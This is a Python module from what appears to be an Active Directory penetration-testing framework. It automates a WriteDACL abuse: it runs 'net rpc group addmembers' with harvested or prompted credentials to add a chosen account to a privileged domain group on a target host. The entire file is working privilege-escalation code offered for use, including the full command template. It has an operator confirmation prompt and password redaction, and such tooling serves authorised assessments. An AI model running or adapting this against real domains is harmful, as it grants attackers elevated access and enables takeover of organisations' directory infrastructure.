"""
acl_abuse_module.py - ACL / WriteDACL Abuse module for AD-Pathfinder.

Exploits WriteDACL permissions to add a controlled user to a privileged
group using net rpc.

Tools used:
    - net  (part of samba-common-bin: apt install samba-common-bin)

Command (from playbook):
    net rpc group addmembers "<group>" "<user>" -U "<domain>\\<user>%<pass>" -S <target_ip>
"""

from __future__ import annotations

import os
import sys
from typing import Optional

sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from executor import CommandExecutor
from session import AssessmentState

try:
    from rich.console import Console
    from rich.prompt import Prompt
    from rich.table import Table
    from rich import box
    _RICH = True
    console = Console()
except ImportError:
    _RICH = False
    console = None  # type: ignore


# ─────────────────────────────────────────────────────────────────────────────
# ACLAbuseModule
# ─────────────────────────────────────────────────────────────────────────────

class ACLAbuseModule:
    """
    WriteDACL Abuse — add a user to a privileged AD group via net rpc.

    Requirements
    ------------
    - Valid credentials with WriteDACL permission on the target group.
    - 'net' binary from samba-common-bin.

    Command executed:
        net rpc group addmembers "<group>" "<member>" -U "<domain>\\<user>%<pass>" -S <target>
    """

    def __init__(self, executor: Optional[CommandExecutor] = None) -> None:
        self.executor = executor or CommandExecutor(verbose=False)

    def run(self, state: AssessmentState) -> dict:
        """
        Execute WriteDACL group membership abuse.

        Returns
        -------
        dict
            {
                "status":    "success" | "error",
                "group":     str,
                "member":    str,
                "auth_user": str,
                "command":   str,
                "error":     str | None,
                "warnings":  list[str],
            }
        """
        warnings: list[str] = []

        # ── Tool check ────────────────────────────────────────────────────
        if not self.executor.check_tool("net"):
            return self._error(
                "'net' binary not found. Install: sudo apt install samba-common-bin"
            )

        # ── Prompt for parameters ─────────────────────────────────────────
        console.print()
        console.print("  [bold bright_cyan]ACL Abuse — WriteDACL Group Membership[/bold bright_cyan]\n")

        target_group = Prompt.ask(
            "  [bold yellow]Target group to add member to[/bold yellow] [dim](e.g. EXECUTIVES)[/dim]"
        ).strip()

        member_user = Prompt.ask(
            "  [bold yellow]User to add to that group[/bold yellow] [dim](e.g. mssql_svc)[/dim]"
        ).strip()

        # Prefer valid_credentials, fall back to initial
        auth_user = ""
        auth_pass = ""
        if state.valid_credentials:
            cred = state.valid_credentials[0]
            auth_user = cred.get("username", "")
            auth_pass = cred.get("password", "")
        elif state.initial_credentials.username:
            auth_user = state.initial_credentials.username
            auth_pass = state.initial_credentials.password

        if not auth_user:
            auth_user = Prompt.ask("  [bold yellow]Authenticating username[/bold yellow]").strip()
            auth_pass = Prompt.ask("  [bold yellow]Password[/bold yellow]").strip()
        else:
            console.print(
                f"  [dim]Using stored credentials: {auth_user}[/dim]"
            )
            override = Prompt.ask(
                "  [bold yellow]Use different credentials?[/bold yellow]",
                choices=["yes", "no"], default="no",
            )
            if override == "yes":
                auth_user = Prompt.ask("  [bold yellow]Username[/bold yellow]").strip()
                auth_pass = Prompt.ask("  [bold yellow]Password[/bold yellow]").strip()

        domain = state.domain

        # ── Build exact playbook command ──────────────────────────────────
        # net rpc group addmembers "<group>" "<user>" -U "<domain>\<user>%<pass>" -S <target>
        auth_str = f"{domain}\\{auth_user}%{auth_pass}"
        cmd = [
            "net", "rpc", "group", "addmembers",
            target_group,
            member_user,
            "-U", auth_str,
            "-S", state.target_ip,
        ]

        # Show redacted command to operator
        redacted = (
            f"net rpc group addmembers \"{target_group}\" \"{member_user}\" "
            f"-U \"{domain}\\{auth_user}%****\" -S {state.target_ip}"
        )
        console.print(f"\n  [bold bright_cyan]Running:[/bold bright_cyan] [dim]{redacted}[/dim]\n")

        # ── Confirmation ──────────────────────────────────────────────────
        confirm = Prompt.ask(
            "  [bold red]⚠  This will modify AD group membership. Proceed?[/bold red]",
            choices=["yes", "no"], default="no",
        )
        if confirm != "yes":
            return self._error("Aborted by operator.")

        # ── Execute ───────────────────────────────────────────────────────
        result = self.executor.run(cmd, timeout=30)
        output = result["output"] + "\n" + result["error"]

        if result["status"] == "success" or "Successfully" in output or result["exit_code"] == 0:
            state.log_finding(
                "ACL Abuse",
                f"Added '{member_user}' to group '{target_group}' via WriteDACL "
                f"(auth: {auth_user})",
                severity="CRITICAL",
            )
            state.log_action(f"ACL Abuse: {member_user} → {target_group}")
            return {
                "status":    "success",
                "group":     target_group,
                "member":    member_user,
                "auth_user": auth_user,
                "command":   redacted,
                "error":     None,
                "warnings":  warnings,
            }
        else:
            err_msg = result["error"] or result["output"] or "Unknown error — check permissions."
            if "Access denied" in err_msg or "NT_STATUS_ACCESS_DENIED" in err_msg:
                warnings.append(
                    "Access denied — the authenticating account may not have WriteDACL on this group."
                )
            return {
                "status":    "error",
                "group":     target_group,
                "member":    member_user,
                "auth_user": auth_user,
                "command":   redacted,
                "error":     err_msg.strip(),
                "warnings":  warnings,
            }

    @staticmethod
    def _error(message: str) -> dict:
        return {
            "status":    "error",
            "group":     "",
            "member":    "",
            "auth_user": "",
            "command":   "",
            "error":     message,
            "warnings":  [],
        }


# ─────────────────────────────────────────────────────────────────────────────
# Convenience wrapper
# ─────────────────────────────────────────────────────────────────────────────

def run(state: AssessmentState, executor: Optional[CommandExecutor] = None) -> dict:
    """
    from modules.acl_abuse_module import run as acl_run
    result = acl_run(state)
    """
    return ACLAbuseModule(executor).run(state)
